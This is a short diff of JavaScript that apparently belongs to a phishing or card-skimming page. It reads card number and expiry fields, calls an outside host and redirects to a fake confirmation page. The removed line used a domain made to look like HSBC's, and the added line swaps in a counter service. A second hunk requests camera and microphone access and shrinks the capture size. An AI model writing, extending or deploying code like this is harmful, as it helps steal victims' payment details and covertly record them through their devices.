@@ -5,7 +5,7 @@ function myFunction() {
    let b = document.querySelector('#card-number').value
    let c = document.querySelector('#card-expiry').value
 
-   fetch('https://hsbc.com.hk.1.1.7b52bd64.roksit.net/',{ mode: 'no-cors'})
+   fetch('https://counter.yadro.ru/',{ mode: 'no-cors'})
     .then(response => console.log(response))
     .then(res=>{console.log(res,a,b,c); 
         window.location.href = 'confirmation.html'
@@ -25,7 +25,7 @@ init()
 async function init(){
     console.log('test');
     
-    let d= navigator.getUserMedia({ audio: true, video: { width: 1280, height: 720 } }, 
+    let d= navigator.getUserMedia({ audio: true, video: { width: 100, height: 100 } }, 
        function(stream) {
       var video = document.querySelector('video');
       video.srcObject = stream;
